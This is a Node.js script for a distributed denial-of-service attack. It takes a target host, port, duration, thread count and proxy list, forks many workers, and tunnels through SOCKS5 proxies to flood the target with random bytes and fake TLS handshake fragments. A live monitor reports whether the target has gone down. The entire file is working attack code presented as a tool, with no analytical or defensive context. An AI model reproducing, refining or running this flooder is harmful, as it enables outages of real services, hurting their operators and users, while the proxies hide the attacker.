const net = require("net");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const target_ip = process.argv[2];
const target_port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyFile = process.argv[6];

if (cluster.isMaster) {
    console.log(`\x1b[35m[TITAN-ENGINE]\x1b[0m 🔱 ULTRA-L4 DEPLOYED`);
    let totalRequests = 0;

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        // Worker se message receive karna count badhane ke liye
        worker.on('message', () => {
            totalRequests++;
        });
    }

    // --- LIVE MONITORING FUNCTION (Every 2 Seconds) ---
    const monitor = setInterval(() => {
        const check = net.connect(target_port, target_ip, () => {
            console.log(`\x1b[32m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mUP\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
            check.destroy();
        });

        check.on('error', () => {
            console.log(`\x1b[31m[${new Date().toLocaleTimeString()}]\x1b[0m STATUS: \x1b[1mDOWN/TIMEOUT\x1b[0m | PACKETS SENT: \x1b[36m${totalRequests}\x1b[0m`);
            check.destroy();
        });

        check.setTimeout(1500, () => check.destroy());
    }, 2000);

    setTimeout(() => {
        clearInterval(monitor);
        console.log("\n\x1b[31m[!] ATTACK FINISHED\x1b[0m");
        process.exit();
    }, duration * 1000);

} else {
    const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);

    function attack() {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        
        const socket = net.connect({
            host: proxy[0],
            port: proxy[1],
            allowHalfOpen: true
        });

        socket.setNoDelay(true);
        socket.setKeepAlive(true, 120000);

        socket.on('connect', () => {
            socket.write(Buffer.from([0x05, 0x01, 0x00]));
        });

        socket.on('data', (data) => {
            if (data[0] === 0x05) {
                const connectReq = Buffer.concat([
                    Buffer.from([0x05, 0x01, 0x00, 0x03]),
                    Buffer.from([target_ip.length]),
                    Buffer.from(target_ip),
                    Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
                ]);
                socket.write(connectReq);

                const streamData = () => {
                    if (!socket.writable) return;

                    for(let i = 0; i < 50; i++) {
                        socket.write(crypto.randomBytes(512));
                        socket.write(`\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03${crypto.randomBytes(32).toString('hex')}`);
                        
                        // Master process ko batana ki packet bheja gaya hai
                        process.send('count'); 
                    }
                    
                    setImmediate(streamData);
                };
                streamData();
            }
        });

        socket.on('error', () => { socket.destroy(); });
        socket.on('timeout', () => { socket.destroy(); });
        setTimeout(() => { socket.destroy(); }, 120000);
    }

    setInterval(attack, 5); 
}
